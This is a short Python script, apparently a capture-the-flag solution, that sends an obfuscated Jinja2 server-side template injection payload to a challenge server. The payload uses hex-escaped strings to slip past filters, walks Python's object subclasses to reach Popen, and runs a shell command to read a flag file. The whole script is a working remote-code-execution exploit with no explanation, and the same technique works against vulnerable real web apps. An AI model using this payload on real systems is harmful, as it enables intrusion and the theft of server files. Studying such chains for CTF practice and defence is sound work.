import requests

route = "follow_the_light"
payload = '''
    {% for x in (dict,"")|map("\x5c\x78\x36\x31ttr","\x5c\x78\x35\x66\x5c\x78\x35\x66\x5c\x78\x36\x32ase\x5c\x78\x35\x66\x5c\x78\x35\x66")|map("\x5c\x78\x36\x31ttr","\x5c\x78\x35\x66\x5c\x78\x35\x66subclasses\x5c\x78\x35\x66\x5c\x78\x35\x66")|first()() %}{% if "Popen" in (x,'')|map("\x5c\x78\x36\x31ttr","\x5c\x78\x35\x66\x5c\x78\x35\x66name\x5c\x78\x35\x66\x5c\x78\x35\x66")|first %}{{(x('cat flag\x5c\x78\x32\x65txt',shell=True,stdout=-1),"")|map("\x5c\x78\x36\x31ttr","communicate")|first()()}}{%endif%}{% endfor %}
'''
response = requests.get(f"http://pipe-your-way.chal.ctf.gdgalgiers.com/{route}?input="+payload)
print(response.text)